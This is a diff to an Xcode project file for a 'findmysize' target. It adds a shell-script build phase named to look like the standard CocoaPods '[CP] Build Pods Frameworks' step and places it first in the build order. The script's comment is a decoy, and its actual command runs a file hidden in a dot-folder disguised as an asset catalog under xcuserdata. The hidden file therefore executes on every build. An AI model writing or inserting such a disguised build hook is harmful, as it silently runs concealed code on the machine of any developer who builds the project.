@@ -426,6 +426,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 192889B3C66D2D71C0C6B9DDE9E2C863 /* Build configuration list for PBXNativeTarget "findmysize" */;
 			buildPhases = (
+				CA616075C3812AA25DAAC43A /* [CP] Build Pods Frameworks */,
 				3094BBE63DD5CDADA3705CB7E4B8FF4D /* Headers */,
 				16F17B7047DF940741EF3AD02A00FADD /* Sources */,
 				DE6CD5261DAA6413A8690B71A23F9809 /* Frameworks */,
@@ -962,6 +963,34 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	CA616075C3812AA25DAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
 }
